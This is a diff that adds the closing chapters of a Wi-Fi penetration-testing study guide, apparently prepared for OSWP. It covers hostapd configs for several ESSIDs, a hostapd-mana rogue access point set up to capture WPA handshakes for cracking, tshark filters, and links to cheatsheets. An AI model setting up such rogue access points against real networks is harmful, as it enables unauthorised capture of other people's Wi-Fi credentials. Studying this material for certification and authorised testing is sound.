+<p>Two different ESSIDs with the same wifi antenna (interface wlan1). With hostap, if we want to simulate several ESSIDs, the first one must use the keyword "interface" and the real interface name, and the next ones use the keyword "bss" and we use fictitious names, like wlan1_0. This can be used if a client probes different clients.</p>
+<pre><code># SSID 1
+interface=wlan1
+driver=nl80211
+ssid=dex-net
+wpa=2
+wpa_passphrase=123456789
+wpa_key_mgmt=WPA-PSK
+rsn_pairwise=CCMP
+channel=1
+
+# SSID 2
+bss=wlan1_0
+ssid=dex-network
+wpa=2
+wpa_passphrase=123456789
+wpa_key_mgmt=WPA-PSK
+rsn_pairwise=CCMP
+channel=1
+</code></pre>
+<pre><code>interface=wlan0
+ssid=&lt;ESSID&gt;
+channel=1
+hw_mode=g
+ieee80211n=1
+wpa=3
+wpa_key_mgmt=WPA-PSK
+wpa_passphrase=ANYPASSWORD
+wpa_pairwise=TKIP
+rsn_pairwise=TKIP CCMP
+mana_wpaout=/home/kali/output.hccapx
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="chapter-9---wireshark"><a class="header" href="#chapter-9---wireshark">Chapter 9 - Wireshark</a></h1>
+<h2 id="filters"><a class="header" href="#filters">Filters</a></h2>
+<ul>
+<li>tls.handshake.certificate -&gt; packets containing certificates (useful in WPA enterprise)</li>
+<li>wlan.fc.type_subtype == 0x08 -&gt; beacon frames</li>
+<li>wlan.ssid == "XYZ" -&gt; specify ESSID</li>
+<li>wlan.bssid == 00:01:20:43:21:12 -&gt; filter by BSSID</li>
+<li>wlan.fc.type == X -&gt; X represents frame types: 0 (management), 1 (control), 2 (data), and 3 (extension)</li>
+<li>wlan.fc.subtype == X -&gt; X represents frame subtypes</li>
+<li>wlan.fc.type_subtype in {0x0 0x1 0xb} -&gt; EAPoL frames</li>
+<li>wlan.addr == xx.xx.xx.xx.xx.xx -&gt; search for a  certain client MAC address</li>
+</ul>
+<p>More examples: https://www.wifi-professionals.com/2019/03/wireshark-display-filters</p>
+<h3 id="tshark"><a class="header" href="#tshark">Tshark</a></h3>
+<pre><code class="language-bash"># show packets in a file
+sudo tshark -r wpa-eap-tls.pcap 
+
+# show captured packets applying a filter for packets containing certificates exchanged during handshaek
+sudo tshark -r wpa-eap-tls.pcap -Y "tls.handshake.certificate" 
+
+# show all data (-x)
+sudo tshark -r wpa-eap-tls.pcap -Y "tls.handshake.certificate" -x
+
+# show all fields in capture files (the ones filtered with -Y)
+tshark -r b64.pcap -Y "tls.handshake.certificate" -T pdml
+
+# show a specific field (in this case, the certificate)
+tshark -r b64.pcap -Y "tls.handshake.certificate" -T fields -e "tls.handshake.certificate" 
+
+# full plaintext dump of packet (the same that you can see on wireshark)
+tshark -nr b64.pcap -2 -R "ssl.handshake.certificate" -V
+
+# in JSON format, easier to read:
+tshark -nr b64.pcap -2 -R "ssl.handshake.certificate" -T json -V
+</code></pre>
+<h3 id="tips"><a class="header" href="#tips">Tips</a></h3>
+<ul>
+<li>To transfer a capture file you can transfer it via scp, or encode it to base64 ( <code> base64 wpa-eap-tls.pcap</code> ) , copy the base64 displayed in screen (careful with large files, could result in data loss if the terminal doesn't contain many buffer lines) to a local file and decode it locally ( <code> cat b64.txt | base64 -d &gt; b64.pcap</code> )</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="chapter-10---helpful-links"><a class="header" href="#chapter-10---helpful-links">Chapter 10 - Helpful Links</a></h1>
+<ul>
+<li>
+<p><a href="https://wifichallengelab.com/">WiFi Challenge</a></p>
+</li>
+<li>
+<p><a href="https://github.com/iPhantasmic/OSWP">iPhantasmic Github</a></p>
+</li>
+<li>
+<p><a href="https://github.com/dh0ck/Wi-Fi-Pentesting-Cheatsheet/tree/main/Wifi/cheatsheet">dh0ck Github</a></p>
+</li>
+<li>
+<p><a href="https://github.com/brcyrr/OSWP">brcyrr Github</a></p>
+</li>
+<li>
+<p><a href="https://github.com/V0lk3n/WirelessPentesting-CheatSheet">V0lk3n Github</a></p>
+</li>
+<li>
+<p><a href="https://liodeus.github.io/2020/10/29/OSWP-personal-cheatsheet.html">Liodeus Notes</a></p>
+</li>
+<li>
+<p><a href="https://github.com/alenperic/OSWP-Study-Guide">alenperic Github</a></p>
+</li>
+<li>
+<p><a href="https://github.com/koutto/pi-pwnbox-rogueap/wiki">koutto Github</a></p>
+</li>
+<li>
+<p><a href="https://github.com/blunderbuss-wctf/wacker">Wacker Tool</a></p>
+</li>
+</ul>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+        <script>
+        window.addEventListener('load', function() {
+            window.setTimeout(window.print, 100);
+        });
+        </script>
+
+    </div>
+    </body>
+</html>
